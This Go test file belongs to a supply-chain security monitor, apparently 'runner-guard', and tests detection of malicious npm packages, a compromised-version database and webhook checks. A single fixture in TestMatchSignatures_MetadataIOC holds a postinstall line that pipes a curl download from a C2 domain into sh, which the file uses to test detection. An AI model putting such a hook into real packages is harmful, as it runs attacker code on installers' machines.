package monitor

import (
	"testing"
	"time"

	"github.com/stretchr/testify/assert"

	"github.com/Vigilant-LLC/runner-guard/v3/internal/deps"
	"github.com/Vigilant-LLC/runner-guard/v3/internal/rules"

	runnerguard "github.com/Vigilant-LLC/runner-guard/v3"
)

func TestMatchSignatures_IOCPackage(t *testing.T) {
	sigs, err := rules.LoadSignatures(runnerguard.RulesFS)
	assert.NoError(t, err)
	assert.True(t, len(sigs) > 0, "should load signatures")

	// Find ioc-package signatures.
	var iocPackageSigs []*rules.ThreatSignature
	for _, sig := range sigs {
		if sig.Type == "ioc-package" {
			iocPackageSigs = append(iocPackageSigs, sig)
		}
	}

	// Test against a known malicious package name from our signatures.
	// The unc1069-axios signatures include "plain-crypto-js".
	alerts := matchSignatures("plain-crypto-js", "npm", "1.0.0", "1.0.1", "", sigs)
	assert.True(t, len(alerts) > 0, "plain-crypto-js should match IOC package signature")
	assert.Equal(t, "plain-crypto-js", alerts[0].Package)
	assert.Equal(t, "npm", alerts[0].Ecosystem)

	// Clean package should not match.
	alerts = matchSignatures("express", "npm", "4.21.0", "4.21.1", "", sigs)
	assert.Equal(t, 0, len(alerts), "express should not match any IOC")
}

func TestMatchSignatures_MetadataIOC(t *testing.T) {
	sigs, err := rules.LoadSignatures(runnerguard.RulesFS)
	assert.NoError(t, err)

	// Metadata containing a known C2 domain should match.
	maliciousMetadata := `name: evil-pkg
version: 1.0.0
script.postinstall: curl https://sfrclak.com/payload | sh`

	alerts := matchSignatures("evil-pkg", "npm", "0.9.0", "1.0.0", maliciousMetadata, sigs)
	assert.True(t, len(alerts) > 0, "sfrclak.com C2 domain should match IOC signature")

	// Clean metadata should not match.
	cleanMetadata := `name: express
version: 4.21.1
script.start: node index.js`

	alerts = matchSignatures("express", "npm", "4.21.0", "4.21.1", cleanMetadata, sigs)
	assert.Equal(t, 0, len(alerts), "clean metadata should not match")
}

func TestCompromisedDBCheck(t *testing.T) {
	db, err := deps.LoadDatabase(runnerguard.RulesFS)
	assert.NoError(t, err)

	// axios 1.14.1 is in the compromised DB (UNC1069).
	finding := db.Check(deps.Dependency{
		Name:      "axios",
		Version:   "1.14.1",
		Ecosystem: "npm",
	})
	assert.NotNil(t, finding, "axios@1.14.1 should be in compromised DB")
	assert.Contains(t, finding.Description, "UNC1069")

	// axios 1.14.0 is clean.
	finding = db.Check(deps.Dependency{
		Name:      "axios",
		Version:   "1.14.0",
		Ecosystem: "npm",
	})
	assert.Nil(t, finding, "axios@1.14.0 should not be compromised")
}

func TestStateTracking(t *testing.T) {
	st := newState()

	// Initial state should be empty.
	assert.Equal(t, "", st.get("npm", "axios"))

	// Set a version.
	st.set("npm", "axios", "1.7.0")
	assert.Equal(t, "1.7.0", st.get("npm", "axios"))

	// Update it.
	st.set("npm", "axios", "1.14.0")
	assert.Equal(t, "1.14.0", st.get("npm", "axios"))

	// Different ecosystem, same name.
	st.set("pypi", "axios", "0.1.0")
	assert.Equal(t, "0.1.0", st.get("pypi", "axios"))
	assert.Equal(t, "1.14.0", st.get("npm", "axios")) // npm unchanged
}

func TestEcosystemSummary(t *testing.T) {
	allDeps := []deps.Dependency{
		{Name: "axios", Ecosystem: "npm"},
		{Name: "express", Ecosystem: "npm"},
		{Name: "flask", Ecosystem: "pypi"},
		{Name: "cobra", Ecosystem: "go"},
	}

	summary := ecosystemSummary(allDeps)
	assert.Contains(t, summary, "2 npm")
	assert.Contains(t, summary, "1 pypi")
	assert.Contains(t, summary, "1 go")
}

func TestAlertStructure(t *testing.T) {
	a := Alert{
		Package:    "axios",
		Ecosystem:  "npm",
		OldVersion: "1.7.0",
		NewVersion: "1.14.1",
		Signature:  "compromised-packages-db",
		Detail:     "Compromised version detected",
		Severity:   "critical",
		Timestamp:  time.Now(),
	}

	assert.Equal(t, "axios", a.Package)
	assert.Equal(t, "npm", a.Ecosystem)
	assert.Equal(t, "1.7.0", a.OldVersion)
	assert.Equal(t, "1.14.1", a.NewVersion)
	assert.Equal(t, "critical", a.Severity)
}

func TestResolveWebhookURL(t *testing.T) {
	// Flag takes effect when no env var.
	cfg := Config{WebhookURL: "https://example.com/hook"}
	assert.Equal(t, "https://example.com/hook", resolveWebhookURL(cfg))

	// Env var takes precedence.
	t.Setenv("RUNNER_GUARD_WEBHOOK_URL", "https://env.example.com/hook")
	assert.Equal(t, "https://env.example.com/hook", resolveWebhookURL(cfg))

	// Empty flag, env var set.
	cfg2 := Config{}
	assert.Equal(t, "https://env.example.com/hook", resolveWebhookURL(cfg2))
}

func TestRequireHTTPS(t *testing.T) {
	// Valid HTTPS URL.
	assert.NoError(t, requireHTTPS("https://hooks.slack.com/services/T00/B00/xxx", "slack"))
	assert.NoError(t, requireHTTPS("https://events.pagerduty.com/v2/enqueue", "webhook"))

	// Empty URL.
	err := requireHTTPS("", "slack")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "no webhook URL configured")

	// HTTP (not HTTPS) -- must be rejected.
	err = requireHTTPS("http://example.com/hook", "webhook")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "must use HTTPS")

	// Other schemes rejected.
	err = requireHTTPS("ftp://example.com/hook", "slack")
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "must use HTTPS")
}
